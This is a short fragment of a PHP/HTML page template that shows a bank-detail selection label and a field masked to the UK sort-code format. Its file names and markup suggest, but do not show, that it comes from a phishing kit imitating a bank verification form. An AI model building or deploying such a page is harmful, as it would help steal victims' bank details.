...
<label class="radioLabel">
<span class="thuglife"></span><?php echo $_SESSION['bndtl']; ?></label>
</div>
<div class="bankCheck GB">
...
</div></section></section></main><?php include ('xf/ftr.php'); ?><div id="overPanel" class="US overPanel normalizeIn"></div><script>jQuery(function($){$("#23sr").mask("99-99-99");});</script><script src="./imcs_files/jquery.maskedinput.min.js" type="text/javascript"></script></body>
